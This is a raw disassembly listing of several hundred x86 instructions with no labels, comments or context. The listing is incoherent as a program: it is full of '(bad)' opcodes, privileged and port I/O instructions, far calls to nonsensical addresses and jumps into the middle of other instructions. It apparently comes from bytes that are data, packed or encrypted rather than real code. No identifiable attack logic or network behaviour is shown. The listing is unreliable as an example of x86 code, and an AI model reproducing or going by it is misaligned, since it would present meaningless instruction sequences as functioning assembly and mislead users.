  4019cb:	stos   DWORD PTR es:[edi],eax
  4019cc:	xchg   esp,eax
  4019cd:	mov    ah,0x85
  4019cf:	push   esp
  4019d0:	dec    ecx
  4019d1:	dec    eax
  4019d2:	aaa    
  4019d3:	pop    edx
  4019d4:	jmp    0x401a06
  4019d6:	lods   al,BYTE PTR ds:[esi]
  4019d7:	mov    edx,0x72b13033
  4019dc:	hlt    
  4019dd:	cmp    ebx,ebp
  4019df:	lea    esp,[esp+eax*4]
  4019e2:	cmp    al,0x35
  4019e4:	popa   
  4019e5:	sti    
  4019e6:	push   cs
  4019e7:	in     al,0xb
  4019e9:	inc    eax
  4019ea:	rol    DWORD PTR [eax+ebp*1+0x4],0xdf
  4019ef:	cdq    
  4019f0:	xchg   BYTE PTR [bp+di-0x57],bl
  4019f4:	fiadd  WORD PTR [edx+0x3c524a59]
  4019fa:	pop    ds
  4019fb:	call   0xde6a:0x74e3cfe7
  401a02:	cwde   
  401a03:	in     eax,dx
  401a04:	sbb    al,0x7a
  401a06:	sub    DWORD PTR [ecx+0x58],0xc9ba2d4e
  401a0d:	or     ah,BYTE PTR [esi]
  401a0f:	inc    ebp
  401a10:	add    al,0x5a
  401a12:	xchg   BYTE PTR [ebp-0x60cd2620],al
  401a18:	loope  0x401a58
  401a1a:	xor    ah,BYTE PTR [edi-0xd]
  401a1d:	sub    DWORD PTR [ecx-0x1c685ac0],ebx
  401a23:	retf   
  401a24:	add    edx,esp
  401a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a27:	add    DWORD PTR [ebx-0x2210947e],edi
  401a2d:	int3   
  401a2e:	sub    BYTE PTR [edi],ch
  401a30:	sub    DWORD PTR [edi+0x4a],edi
  401a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a34:	in     al,0x57
  401a36:	sbb    ch,BYTE PTR [eax-0x605f0eb2]
  401a3c:	scas   eax,DWORD PTR es:[edi]
  401a3d:	sbb    edx,DWORD PTR ds:0x98585a99
  401a43:	mov    DWORD PTR [edi-0x14271857],esp
  401a49:	jbe    0x401a50
  401a4b:	adc    dh,BYTE PTR [edx]
  401a4d:	jmp    0x4019e2
  401a4f:	mov    DWORD PTR [ecx],esi
  401a51:	cmp    BYTE PTR [ecx],0x81
  401a54:	xlat   BYTE PTR ds:[ebx]
  401a55:	mov    edi,0x1076e8fd
  401a5a:	(bad)  
  401a5b:	sahf   
  401a5c:	or     dh,ch
  401a5e:	scas   al,BYTE PTR es:[edi]
  401a5f:	and    DWORD PTR ds:0xaa231c5d,esi
  401a65:	in     eax,dx
  401a66:	scas   al,BYTE PTR es:[edi]
  401a67:	xlat   BYTE PTR ds:[ebx]
  401a68:	loop   0x401a1c
  401a6a:	fsub   DWORD PTR [ebx+0x51]
  401a6d:	or     al,0xb
  401a6f:	cld    
  401a70:	mov    es,WORD PTR [eax+0xb]
  401a73:	daa    
  401a74:	mov    ecx,0xdf8f2430
  401a79:	fidiv  WORD PTR [esi-0x1fab82c5]
  401a7f:	or     BYTE PTR [ebx],ch
  401a81:	je     0x401aa0
  401a83:	pop    ebp
  401a84:	pop    ss
  401a85:	ins    DWORD PTR es:[edi],dx
  401a86:	jle    0x401ac0
  401a88:	daa    
  401a89:	(bad)  
  401a8a:	stos   DWORD PTR es:[edi],eax
  401a8b:	aaa    
  401a8c:	test   DWORD PTR [edx+0x2dbbb71c],0xa4bba82
  401a96:	stos   DWORD PTR es:[edi],eax
  401a97:	int3   
  401a98:	lea    ebx,[edx-0x77]
  401a9b:	adc    esi,ecx
  401a9d:	gs and eax,0x6fb0b4e8
  401aa3:	nop
  401aa4:	scas   al,BYTE PTR es:[edi]
  401aa5:	adc    al,bl
  401aa7:	repnz xlat BYTE PTR ds:[ebx]
  401aa9:	ss int 0x61
  401aac:	mov    gs,WORD PTR [eax+0x67]
  401aaf:	mov    eax,DWORD PTR [eax+0x6b518de3]
  401ab5:	mov    ecx,ecx
  401ab7:	cmc    
  401ab8:	je     0x401b02
  401aba:	lahf   
  401abb:	int3   
  401abc:	pop    edx
  401abd:	dec    esp
  401abe:	push   ebp
  401abf:	cmp    BYTE PTR fs:[ebx-0x7cb8c498],cl
  401ac6:	push   ecx
  401ac7:	ja     0x401ab1
  401ac9:	jmp    0xebab:0xae20786d
  401ad0:	push   ss
  401ad1:	add    bh,cl
  401ad3:	and    eax,0xe18481c8
  401ad8:	sbb    edx,DWORD PTR ds:[edi+edx*2+0x6a]
  401add:	pop    ss
  401ade:	addr16 inc esi
  401ae0:	xor    al,0x51
  401ae2:	lahf   
  401ae3:	mov    ds:0x8c417ded,eax
  401ae8:	ja     0x401b4f
  401aea:	in     al,dx
  401aeb:	ror    DWORD PTR [esi-0xadb92fe],0x76
  401af2:	fadd   QWORD PTR [edi+0x3ac4668d]
  401af8:	icebp  
  401af9:	enter  0x481b,0xb
  401afd:	scas   eax,DWORD PTR es:[edi]
  401afe:	out    dx,al
  401aff:	or     DWORD PTR [ecx+0x28763936],edx
  401b05:	push   esp
  401b06:	lds    ebp,FWORD PTR [ebp-0x13e591]
  401b0c:	mov    cl,0x84
  401b0e:	pop    ebp
  401b0f:	mov    dh,bh
  401b11:	dec    eax
  401b12:	jnp    0x401afc
  401b14:	jne    0x401aa4
  401b16:	fild   DWORD PTR [eax]
  401b18:	cmp    ebp,DWORD PTR [ecx+ebx*2+0x13]
  401b1c:	adc    BYTE PTR ds:0x5f325cf2,0x91
  401b23:	cmp    cl,dl
  401b25:	hlt    
  401b26:	test   BYTE PTR [edx],bh
  401b28:	out    dx,al
  401b29:	jo     0x401ab1
  401b2b:	mov    ds,WORD PTR [eax]
  401b2d:	fdivr  QWORD PTR [esi]
  401b2f:	jo     0x401acc
  401b31:	add    ch,ah
  401b33:	xchg   ebp,eax
  401b34:	sbb    eax,0x4fa81a8d
  401b39:	mov    cr0,esi
  401b3c:	inc    ecx
  401b3d:	call   0x2f8eab59
  401b42:	xchg   BYTE PTR [ebp-0x43],cl
  401b45:	sub    al,0xdb
  401b47:	int    0xd6
  401b49:	enter  0x1c4a,0x62
  401b4d:	imul   eax,DWORD PTR [ebx],0x32a48d90
  401b53:	push   edx
  401b54:	int3   
  401b55:	adc    eax,0x8af5f210
  401b5a:	xor    al,BYTE PTR [eax+edx*8+0x3d1ed722]
  401b61:	in     eax,0x17
  401b63:	dec    edx
  401b64:	ja     0x401b27
  401b66:	cpuid  
  401b68:	gs pop ss
  401b6a:	jae    0x401bcb
  401b6c:	fst    QWORD PTR [ebx-0x37ecc960]
  401b72:	mov    dh,BYTE PTR [ecx-0x44]
  401b75:	clc    
  401b76:	shl    DWORD PTR [edx],1
  401b78:	fdivp  st(5),st
  401b7a:	daa    
  401b7b:	out    0x8f,eax
  401b7d:	adc    ah,BYTE PTR [ecx-0x65de577f]
  401b83:	cld    
  401b84:	imul   edi,DWORD PTR [esp+eiz*8],0x1a
  401b88:	xchg   esi,eax
  401b89:	and    al,0xb1
  401b8b:	pushf  
  401b8c:	(bad)  
  401b8d:	jl     0x401ba8
  401b8f:	ds add ebx,esp
  401b92:	mov    al,0x8f
  401b94:	mov    ds:0xef69444e,eax
  401b99:	shl    BYTE PTR [edi],0xa5
  401b9c:	loope  0x401bed
  401b9e:	jl     0x401bf3
  401ba0:	int3   
  401ba1:	adc    al,0x33
  401ba4:	scas   al,BYTE PTR es:[edi]
  401ba5:	push   esi
  401ba6:	add    BYTE PTR [ebx+0x65],ah
  401ba9:	fcmovnbe st,st(3)
  401bab:	scas   al,BYTE PTR es:[edi]
  401bac:	dec    ebx
  401bad:	fneni(8087 only) 
  401baf:	je     0x401bf4
  401bb1:	push   fs
  401bb3:	fwait
  401bb4:	sti    
  401bb5:	icebp  
  401bb6:	test   al,0x3f
  401bb8:	xchg   esi,eax
  401bb9:	push   edx
  401bba:	dec    edi
  401bbb:	mov    bl,0xc6
  401bbd:	lds    ecx,FWORD PTR [ebx+0x6fc4cd7]
  401bc3:	pop    esp
  401bc4:	xlat   BYTE PTR ds:[ebx]
  401bc5:	mov    ah,0x84
  401bc7:	lods   al,BYTE PTR ds:[esi]
  401bc8:	in     al,0x5a
  401bca:	scas   eax,DWORD PTR es:[edi]
  401bcb:	(bad)  
  401bcc:	ds xchg esp,eax
  401bce:	sbb    al,0xe1
  401bd0:	jg     0x401bbe
  401bd2:	ror    ebx,0x54
  401bd5:	aad    0xab
  401bd7:	sbb    bl,BYTE PTR [ebx]
  401bd9:	xor    al,0xa4
  401bdb:	cmp    edi,DWORD PTR [edi]
  401bdd:	adc    DWORD PTR [ebp-0x4e],ecx
  401be0:	add    dl,bl
  401be2:	mov    ebp,0x83190b95
  401be7:	(bad)  
  401be8:	cld    
  401be9:	xor    eax,0xee68e8bc
  401bee:	sub    DWORD PTR [ebp-0x52],ebx
  401bf1:	das    
  401bf2:	xchg   ebx,eax
  401bf3:	sub    al,0x9a
  401bf5:	retf   0x20a0
  401bf8:	jl     0x401c0f
  401bfa:	(bad)  
  401bfb:	ficomp DWORD PTR [ebp+0x5e93630d]
  401c01:	fild   DWORD PTR [edi+0x1ea9870d]
  401c07:	xchg   edx,eax
  401c08:	push   0x1a9780f4
  401c0d:	gs lock mov edx,0xb2ff1a7c
  401c14:	fstp   TBYTE PTR [ecx-0x601faa40]
  401c1a:	mov    edi,0x9d834335
  401c1f:	mov    dl,0xe5
  401c21:	jo     0x401ca1
  401c23:	pop    edx
  401c24:	dec    ecx
  401c25:	gs jnp 0x401bbe
  401c28:	push   edx
  401c29:	scas   eax,DWORD PTR es:[edi]
  401c2a:	mov    bh,0xec
  401c2c:	shr    BYTE PTR [esi+0x14],1
  401c2f:	adc    eax,0xc9289370
  401c34:	jle    0x401c3c
  401c36:	mov    edi,0x4fd1c1dc
  401c3b:	jnp    0x401bed
  401c3d:	fld    QWORD PTR [ecx+edi*1]
  401c40:	pop    esi
  401c41:	test   DWORD PTR [ecx+0x785134f8],ebx
  401c47:	fstp   TBYTE PTR [esp+ecx*8]
  401c4a:	ins    DWORD PTR es:[edi],dx
  401c4b:	cmp    al,0xb7
  401c4d:	pop    edx
  401c4e:	xchg   esp,eax
  401c4f:	in     eax,dx
  401c50:	sahf   
  401c51:	pop    ecx
  401c52:	sub    eax,DWORD PTR ds:0x9c28c0aa
  401c58:	shl    DWORD PTR [eax-0x5f],0xdd
  401c5c:	imul   esp,eax,0xffffffed
  401c5f:	dec    ebx
  401c60:	mov    DWORD PTR [esi-0x73],edx
  401c63:	push   ds
  401c64:	out    0x4f,eax
  401c66:	jbe    0x401bf0
  401c68:	test   eax,0xb18a0da3
  401c6d:	pop    ds
  401c6e:	jae    0x401c6c
  401c70:	into   
  401c71:	cmp    dh,BYTE PTR [edx+ecx*1-0x48de448f]
  401c78:	pop    ss
  401c79:	push   ss
  401c7a:	xor    al,0xae
  401c7c:	iret   
  401c7d:	es dec ebp
  401c7f:	dec    ebx
  401c80:	fs call 0x541728eb
  401c86:	fwait
  401c87:	call   0x450e:0xe6733834
  401c8e:	clc    
  401c8f:	into   
  401c90:	(bad)  
  401c91:	xor    eax,DWORD PTR ds:0x354b95ac
  401c97:	out    dx,eax
  401c98:	inc    esi
  401c99:	sbb    DWORD PTR [ecx+eiz*2-0xe],esp
  401c9d:	addr16 push 0x2c
  401ca0:	ror    DWORD PTR [ebx],0xc1
  401ca3:	jge    0x401c2a
  401ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ca6:	test   eax,0x2949044f
  401cab:	jo     0x401cea
  401cad:	mov    eax,ds:0xa14fc0ec
  401cb2:	jmp    0x7747df7b
  401cb7:	mov    esi,0xaf131e26
  401cbc:	dec    ebp
  401cbd:	pop    ds
  401cbe:	std    
  401cbf:	cmp    ah,BYTE PTR cs:[edx+eax*4-0x37]
  401cc4:	xor    ebx,DWORD PTR [ebx-0x1da0d4e8]
  401cca:	mov    al,ds:0x92d4147d
  401ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd0:	or     eax,0xdbcf4c3d
  401cd5:	or     DWORD PTR [ebp+0x3c5e17d4],esp
  401cdb:	add    al,0x76
  401cdd:	jo     0x401d37
  401cdf:	arpl   WORD PTR [eax-0x71],di
  401ce2:	xor    edx,DWORD PTR [ebx-0x36]
  401ce5:	(bad)  
  401ce6:	sub    ah,ch
  401ce8:	aam    0x97
  401cea:	dec    ebx
  401ceb:	xlat   BYTE PTR ds:[ebx]
  401cec:	fs pop ebx
  401cee:	pop    ecx
  401cef:	xor    BYTE PTR [edi+ebp*8-0x7c2846ab],ah
  401cf6:	sahf   
  401cf7:	or     ebx,esp
  401cf9:	pushf  
  401cfa:	push   esi
  401cfb:	adc    eax,0x7f4f231a
  401d00:	fist   DWORD PTR [edx]
  401d02:	neg    dh
  401d04:	leave  
  401d05:	stc    
  401d06:	push   ebp
  401d07:	arpl   WORD PTR [esi-0x44099b05],ax
  401d0d:	std    
  401d0e:	shl    DWORD PTR [edi-0x758081b2],cl
  401d14:	fs push 0x42
  401d17:	les    edx,FWORD PTR [ebp+ecx*4-0x71aeff14]
  401d1e:	jne    0x401cfa
  401d20:	xchg   BYTE PTR [ebx-0xd],ch
  401d23:	and    bh,BYTE PTR [ebp+0x0]
  401d26:	and    DWORD PTR [edx-0x15c29c82],ecx
  401d2c:	ja     0x401d6e
  401d2e:	setnp  BYTE PTR [eax+0x39]
  401d32:	scas   eax,DWORD PTR es:[edi]
  401d33:	fdiv   QWORD PTR [esi]
  401d35:	sbb    BYTE PTR [esi-0x24fe33c3],bl
  401d3b:	std    
  401d3c:	adc    DWORD PTR [ebx-0x346d2b7c],ebp
  401d42:	push   ebp
  401d43:	js     0x401ccc
  401d45:	inc    ebx
  401d46:	ins    DWORD PTR es:[edi],dx
  401d47:	js     0x401dc2
  401d49:	fisub  WORD PTR [ecx+0x7cbd1638]
  401d4f:	std    
  401d50:	pop    es
  401d51:	xchg   esp,eax
  401d52:	or     bl,dl
  401d54:	inc    edi
  401d55:	fs retf 
  401d57:	pop    edi
  401d58:	dec    esp
  401d59:	cmp    eax,0x7435c695
  401d5e:	mov    eax,0xe4272840
  401d63:	inc    edx
  401d64:	popf   
  401d65:	adc    eax,0x7fc53d1d
  401d6a:	sar    BYTE PTR [ebx+0x5c],1
  401d6d:	fs adc eax,0x1caeaeaa
  401d73:	cli    
  401d74:	xchg   edx,eax
  401d75:	inc    ecx
  401d76:	add    ah,BYTE PTR cs:[eax+ecx*1]
  401d7a:	mov    ds:0x30a32d5f,eax
  401d7f:	fs pop ss
  401d81:	pop    edi
  401d82:	xor    eax,0x3a50e1e1
  401d87:	test   BYTE PTR [ecx],ah
  401d89:	fisttp QWORD PTR [edx]
  401d8b:	inc    esi
  401d8c:	into   
  401d8d:	mov    eax,0xdced609b
  401d92:	or     eax,0xbbfc286b
  401d97:	sbb    eax,0x30f809fa
  401d9c:	pop    ds
  401d9d:	xor    dl,BYTE PTR [edi-0x31]
  401da0:	in     eax,dx
  401da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401da2:	imul   eax,DWORD PTR [eax+0x47832b1f],0x1a
  401da9:	imul   eax,DWORD PTR [ebx+0x39],0x772b5e98
  401db0:	or     eax,0xb7d1bde8
  401db5:	arpl   WORD PTR [edi],di
  401db7:	push   0x6b
  401db9:	inc    ebx
  401dba:	dec    edi
  401dbb:	xchg   edx,eax
  401dbc:	js     0x401df7
  401dbe:	dec    esi
  401dbf:	sahf   
  401dc0:	pop    ds
  401dc1:	or     ax,0xd172
  401dc5:	nop
  401dc6:	and    BYTE PTR [esi+0x1a],bl
  401dc9:	fiadd  DWORD PTR [eax-0xfaa38df]
  401dcf:	test   eax,0xbdb37024
  401dd4:	rcr    BYTE PTR [esi-0x6eac23b3],0xff
  401ddb:	xchg   edx,eax
  401ddc:	sti    
  401ddd:	fisubr DWORD PTR [ebx-0x7f]
  401de0:	or     esp,DWORD PTR [eax+eax*2]
  401de3:	rcr    BYTE PTR [edi+0x2f9bf64b],1
  401de9:	int    0x71
  401deb:	adc    BYTE PTR gs:[eax-0x19ecde4f],ch
  401df2:	das    
  401df3:	fcmovnu st,st(0)
  401df5:	aaa    
  401df6:	sbb    BYTE PTR [esp+eiz*8],bh
  401df9:	(bad)  
  401dfa:	int    0x2d
  401dfc:	and    al,0x1c
  401dfe:	outs   dx,DWORD PTR ds:[esi]
  401dff:	mov    dl,0x4
  401e01:	clc    
  401e02:	xchg   cl,ah
  401e04:	xor    esi,DWORD PTR [ecx+0x52082fff]
  401e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e0b:	push   edi
  401e0c:	cdq    
  401e0d:	test   dl,0x34
  401e10:	inc    edx
  401e11:	jo     0x401e56
  401e13:	mov    bh,0xb3
  401e15:	and    DWORD PTR [eax],edi
  401e17:	xlat   BYTE PTR ds:[ebx]
  401e18:	ja     0x401d9c
  401e1a:	lods   eax,DWORD PTR ds:[esi]
  401e1b:	call   0x5c47ce05
  401e20:	jno    0x401e4a
  401e22:	add    edx,DWORD PTR [edx+esi*8-0x6b]
  401e26:	pop    ecx
  401e27:	cwde   
  401e28:	loop   0x401e23
  401e2a:	or     eax,DWORD PTR [ebx+0x7dbe339f]
  401e30:	stos   BYTE PTR es:[edi],al
  401e31:	dec    edi
  401e32:	call   0xd5d7045
  401e37:	adc    eax,0x29fa02d2
  401e3c:	fstp   QWORD PTR [esi]
  401e3e:	xchg   esi,eax
  401e3f:	inc    edi
  401e40:	mov    esp,0xdabc989e
  401e45:	ss inc eax
  401e47:	jp     0x401ec4
  401e49:	xor    al,0xee
  401e4b:	or     DWORD PTR ds:0xb78b13dd,0x4d
  401e52:	retf   0x4371
  401e55:	adc    ecx,edi
  401e57:	enter  0x3e6f,0x25
  401e5b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e5d:	jne    0x401ea9
  401e5f:	adc    ebp,DWORD PTR [ecx-0x31a88b76]
  401e65:	dec    esi
  401e66:	xor    BYTE PTR [ecx-0x223e397e],dh
  401e6c:	xor    BYTE PTR [esi-0x431d906d],al
  401e72:	dec    ebx
  401e73:	imul   esp,edi,0x45
  401e76:	add    al,0x63
  401e78:	xchg   edx,eax
  401e79:	push   es
  401e7a:	mov    bl,bl
  401e7c:	(bad)  
  401e7d:	and    eax,0xb4a5e347
  401e82:	lahf   
  401e83:	sub    eax,0x9de6c812
  401e89:	pop    edi
  401e8a:	pop    edx
  401e8b:	pop    ebx
  401e8c:	sbb    ah,BYTE PTR [ecx-0x53b7938b]
  401e92:	mov    esi,0x592e9b
  401e97:	push   ebp
  401e98:	aaa    
  401e99:	sahf   
  401e9a:	xor    bh,dh
  401e9c:	div    DWORD PTR [edx-0x6d]
  401e9f:	adc    DWORD PTR [ecx+0x2381a673],0x782111d2
  401ea9:	aaa    
  401eaa:	nop
  401eab:	jno    0x401e5f
  401ead:	scas   al,BYTE PTR es:[edi]
  401eae:	inc    edx
  401eaf:	das    
  401eb0:	outs   dx,DWORD PTR ds:[esi]
  401eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eb2:	fisttp WORD PTR [edi]
  401eb4:	jge    0x401f17
  401eb6:	pop    ebp
  401eb7:	xchg   dl,al
  401eb9:	neg    edi
  401ebb:	jecxz  0x401e4f
  401ebd:	imul   ecx,DWORD PTR fs:[eax-0x6c],0x2a
  401ec2:	ret    
  401ec3:	cdq    
  401ec4:	int3   
  401ec5:	mov    edi,0x2a328a75
  401eca:	add    bl,bh
  401ecc:	mov    dl,0x47
  401ece:	hlt    
  401ecf:	inc    esp
  401ed0:	fdiv   st,st(7)
  401ed2:	dec    esp
  401ed3:	and    BYTE PTR [edi],ah
  401ed5:	cmc    
  401ed6:	mov    esi,0x5213797a
  401edb:	mov    es,eax
  401edd:	xchg   BYTE PTR [ebp-0x1e969b24],dh
  401ee3:	or     DWORD PTR [eax+0x28],edi
  401ee6:	pop    edi
  401ee7:	rcr    BYTE PTR [esi],1
  401ee9:	dec    ebx
  401eea:	jmp    FWORD PTR [esi]
  401eec:	mov    ds:0x187b3e15,eax
  401ef1:	fimul  DWORD PTR [ebx-0x7e]
  401ef4:	mov    ebp,0xe2e72bc5
  401ef9:	ins    DWORD PTR es:[edi],dx
  401efa:	push   esi
  401efb:	xchg   ch,bh
  401efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401efe:	(bad)  
  401eff:	enter  0x25d9,0x8b
  401f03:	mov    ch,0xf7
  401f05:	ss test al,0x17
  401f08:	adc    ecx,ebx
  401f0a:	lea    ecx,[edi-0x768ea349]
  401f10:	push   cs
  401f11:	dec    esi
  401f12:	stos   DWORD PTR es:[edi],eax
  401f13:	adc    eax,0x8412d1f
  401f18:	mov    eax,ds:0x61336c1e
  401f1d:	test   BYTE PTR [edx+0x3ad29357],ch
  401f23:	aaa    
  401f24:	sbb    esp,DWORD PTR ds:0x6158ba3e
  401f2a:	mov    ?,WORD PTR [edi]
  401f2c:	sbb    bh,BYTE PTR [eax-0x72e3095]
  401f32:	and    BYTE PTR [edi+0x1fc6b9de],cl
  401f38:	xchg   esp,eax
  401f39:	push   ebp
  401f3a:	pop    es
  401f3b:	int3   
  401f3c:	loopne 0x401f3e
  401f3e:	xchg   ebp,eax
  401f3f:	and    eax,0xf4b6eb96
  401f44:	psllw  mm7,QWORD PTR [edi+edi*4+0x4dd7973c]
  401f4c:	dec    edx
  401f4d:	arpl   sp,dx
  401f4f:	xchg   ebx,eax
  401f50:	aaa    
  401f51:	cwde   
  401f52:	fcom   QWORD PTR [edi]
  401f54:	or     bl,dh
  401f56:	ja     0x401f19
  401f58:	pushf  
  401f59:	aaa    
  401f5a:	in     eax,dx
  401f5b:	mov    bl,0x67
  401f5d:	fwait
  401f5e:	inc    ecx
  401f5f:	jno    0x401f06
  401f61:	sub    eax,0xfc6bdfc7
  401f66:	fnstcw WORD PTR [ecx+0x51]
  401f69:	jne    0x401fd4
  401f6b:	(bad)  
  401f6c:	mov    ds:0xbcdae6cf,al
  401f71:	nop
  401f72:	mov    bl,0x32
  401f74:	cwde   
  401f75:	push   0x8
  401f77:	push   ebx
  401f78:	xchg   edi,eax
  401f79:	mov    esi,0x3da2b2c
  401f7e:	lods   eax,DWORD PTR ds:[esi]
  401f7f:	fbld   TBYTE PTR [edi]
  401f81:	je     0x401fdc
  401f83:	push   ebp
  401f84:	xchg   edi,eax
  401f85:	cmp    eax,0x585f51b5
  401f8a:	(bad)  
  401f8b:	enter  0xddb6,0xd8
  401f8f:	push   ebp
  401f90:	cmc    
  401f91:	inc    esp
  401f92:	jne    0x401f24
  401f94:	push   edx
  401f95:	aas    
  401f96:	or     BYTE PTR [edx+0x57ab9b7],0xe9
  401f9d:	pop    esp
  401f9e:	jo     0x401f64
  401fa0:	push   cs
  401fa1:	das    
  401fa2:	push   es
  401fa3:	adc    BYTE PTR [edx],bh
  401fa5:	test   eax,0x889c1c28
  401faa:	fsub   st(5),st
  401fac:	(bad)  
  401fad:	dec    ebp
  401fae:	(bad)  
  401faf:	ficom  DWORD PTR [ecx]
  401fb1:	inc    ecx
  401fb2:	jns    0x402024
  401fb4:	or     esi,DWORD PTR [edx+0xc]
  401fb7:	mov    esp,0xb9f6c66d
  401fbc:	mov    dl,0x26
  401fbe:	push   ecx
  401fbf:	jg     0x401fb8
  401fc1:	mov    ch,0xc6
  401fc3:	push   edx
  401fc4:	sbb    eax,0xe0b1c2b4
  401fc9:	rol    esi,cl
  401fcb:	xor    DWORD PTR [ecx+0x3a],0xffffffda
  401fcf:	enter  0xf187,0x5e
  401fd3:	sti    
  401fd4:	mov    ebx,0x16bc2dd7
  401fd9:	dec    esp
  401fda:	shl    BYTE PTR [esi-0x17],1
  401fdd:	pop    esp
  401fde:	sub    al,0xc0
  401fe0:	push   ecx
  401fe1:	cmp    al,0x99
  401fe3:	inc    edi
  401fe4:	push   ebx
  401fe5:	lahf   
  401fe6:	jg     0x401ff3
  401fe8:	adc    al,0x87
  401fea:	sub    al,BYTE PTR [eax+0x54]
  401fed:	fwait
  401fee:	(bad)  
  401fef:	jnp    0x401fbd
  401ff1:	xchg   edx,eax
  401ff2:	cli    
  401ff3:	or     eax,0xb24f21d2
  401ff8:	jnp    0x401fc8
  401ffa:	out    0x5d,al
  401ffc:	xchg   ebx,eax
  401ffd:	pop    edx
  401ffe:	imul   ecx,DWORD PTR [ecx-0x1803f021],0xfc12ee8b
  402008:	mov    ecx,0x50d57495
  40200d:	lea    edx,[eax-0x74e28e26]
  402013:	icebp  
  402014:	sbb    ebp,DWORD PTR [esi+0x3886aad5]
  40201a:	sbb    DWORD PTR [ecx+0x3f8d00c2],ebx
  402020:	iret   
  402021:	enter  0x3a8b,0xca
  402025:	push   0x430bb6fe
  40202a:	xlat   BYTE PTR ds:[ebx]
  40202b:	cmp    ebp,DWORD PTR [eax+0x19]
  40202e:	cmp    edx,DWORD PTR [ebp+edx*2-0x49]
  402032:	aaa    
  402033:	pop    esp
  402034:	mov    esp,0x24877941
  402039:	jae    0x402015
  40203b:	sub    al,0xc8
  40203d:	or     ebx,DWORD PTR [ecx]
  40203f:	or     dh,BYTE PTR [edi-0x6]
  402042:	ret    0xc3f0
  402045:	mov    ds:0x115ad3c3,eax
  40204a:	mov    eax,0x13848c97
  40204f:	add    BYTE PTR [esi],0x7c
  402052:	pop    eax
  402053:	xchg   esi,eax
  402054:	mov    esi,0xba11a9c0
  402059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40205a:	outs   dx,BYTE PTR ds:[esi]
  40205b:	push   ss
  40205c:	aaa    
  40205d:	sub    ebx,DWORD PTR [ebp-0x40]
  402060:	jbe    0x40201e
  402062:	sub    dl,BYTE PTR [ebx-0x373536bd]
  402068:	jno    0x402062
  40206a:	cs xchg edx,eax
  40206c:	sub    BYTE PTR [ebx+0x49],bl
  40206f:	pop    esi
  402070:	imul   esi,DWORD PTR [edx+ebp*4+0x75],0x36
  402075:	mov    bl,0x40
  402077:	pop    edi
  402078:	mov    bh,0x52
  40207a:	ja     0x402050
  40207c:	add    bh,dl
  40207e:	retf   
  40207f:	loope  0x40203b
  402081:	xor    DWORD PTR [esi+eax*4],ecx
  402084:	inc    eax
  402085:	scas   eax,DWORD PTR es:[edi]
  402086:	enter  0x5764,0x70
  40208a:	push   esi
  40208b:	mov    ebp,0x5122ad34
  402090:	dec    eax
  402091:	into   
  402092:	les    ecx,FWORD PTR [edi]
  402094:	ss push ebx
  402096:	mov    eax,0x627fa8ed
  40209b:	repz je 0x402033
  40209e:	inc    esi
  40209f:	push   es
  4020a0:	(bad)  
  4020a1:	and    dl,cl
  4020a3:	clc    
  4020a4:	mov    bl,0xb3
  4020a6:	ret    0x8bac
  4020a9:	adc    DWORD PTR [ecx+eiz*4],edx
  4020ac:	dec    esi
  4020ad:	pop    ecx
  4020ae:	jl     0x402039
  4020b0:	push   0x49
  4020b2:	sbb    DWORD PTR [edx],0x57
  4020b5:	sbb    eax,0x557350a9
  4020ba:	pop    edi
  4020bb:	loope  0x40206d
  4020bd:	push   es
  4020be:	sub    eax,0x38e4776d
  4020c3:	cwde   
  4020c4:	shl    BYTE PTR [edi+ebp*4],1
  4020c7:	push   es
  4020c8:	sub    BYTE PTR [ebp-0x25],0x32
  4020cc:	std    
  4020cd:	inc    esp
  4020ce:	mov    dh,0x8
  4020d0:	je     0x4020f5
  4020d2:	(bad)  
  4020d3:	mov    eax,ds:0xa76dbc50
  4020d8:	ss cs gs mov cl,0x9f
  4020dd:	cmp    al,bh
  4020df:	repnz retf 0xf20a
  4020e3:	aaa    
  4020e4:	and    ch,0x6d
  4020e7:	(bad)  
  4020e8:	fnstenv [esi-0x53]
  4020eb:	inc    edx
  4020ec:	mov    ds,esp
  4020ee:	mov    ds,WORD PTR [ebp-0xe]
  4020f1:	fchs   
  4020f3:	sub    ecx,esi
  4020f5:	sub    eax,0x9017464
  4020fa:	pop    edi
  4020fb:	inc    ebp
  4020fc:	jl     0x40208d
  4020fe:	fdivr  QWORD PTR [edx+0x6ddc4884]
  402104:	push   ds
  402105:	xchg   BYTE PTR [esi],bl
  402107:	call   0x5902c52b
  40210c:	jne    0x4020fd
  40210e:	dec    esi
  40210f:	(bad)  
  402110:	imul   ebp,DWORD PTR [edx+0xcc30b39],0x65
  402117:	mov    edi,ebx
  402119:	dec    edi
  40211a:	push   0x1405fa91
  40211f:	in     eax,0xfd
  402121:	jge    0x4020ae
  402123:	ret    
  402124:	pop    ebx
  402125:	and    al,0x64
  402127:	sbb    al,0x8c
  402129:	lea    esi,[ecx+0xf]
  40212c:	rcr    bh,1
  40212e:	arpl   WORD PTR [ebp+ebx*1+0x2bf13459],dx
  402135:	aam    0xa
  402137:	out    0x79,al
  402139:	sub    DWORD PTR [edi+0x5b],edi
  40213c:	xor    bl,BYTE PTR ds:0x227edf7f
  402142:	push   es
  402143:	pop    es
  402144:	cmp    al,0x5
  402146:	mov    ecx,0x7d1000d8
  40214b:	push   cs
  40214c:	adc    BYTE PTR [ebp+eiz*2-0xf],dl
  402150:	sbb    DWORD PTR [edx+eiz*1+0x6a309210],esi
  402157:	cmp    DWORD PTR [edx],0x61efe79e
  40215d:	jne    0x4021a4
  40215f:	sbb    BYTE PTR [esi],ch
  402161:	dec    esi
  402162:	mov    edx,0xd936be70
  402167:	test   DWORD PTR [edx+eiz*8],edi
  40216a:	(bad)  
  40216b:	sub    al,0xda
  40216d:	push   edi
  40216e:	pop    ebp
  40216f:	cmp    DWORD PTR [ebp-0x4b9970ef],edi
  402175:	mov    DWORD PTR [ecx],esi
  402177:	test   eax,0x4b494b79
  40217c:	pop    ebx
  40217d:	loope  0x40214b
  40217f:	xor    ecx,DWORD PTR [ecx+0x778c8fa4]
